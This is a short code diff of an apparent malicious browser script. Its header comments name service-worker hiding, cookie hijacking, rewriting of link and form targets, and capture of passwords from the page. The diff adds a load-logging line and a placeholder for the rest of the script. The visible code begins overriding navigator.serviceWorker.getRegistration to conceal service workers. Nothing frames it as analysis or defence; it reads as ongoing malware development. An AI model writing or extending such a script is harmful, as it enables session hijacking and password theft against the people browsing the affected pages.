@@ -2,7 +2,9 @@
 // ORIGINAL FEATURES: SW hiding, cookie hijack, href/action rewriting
 // PLUS: DOM password capture with Console Logs (for debugging)
 // ============================================================
+console.log('[DOM SCRIPT] script_Vx9Z6XN5uC3k.js loaded successfully!');
 
+// ... (rest of the DOM script as before)
 // ---- 1. Hide Service Worker ----
 (function () {
     const originalServiceWorkerGetRegistrationDescriptor = navigator.serviceWorker.getRegistration;
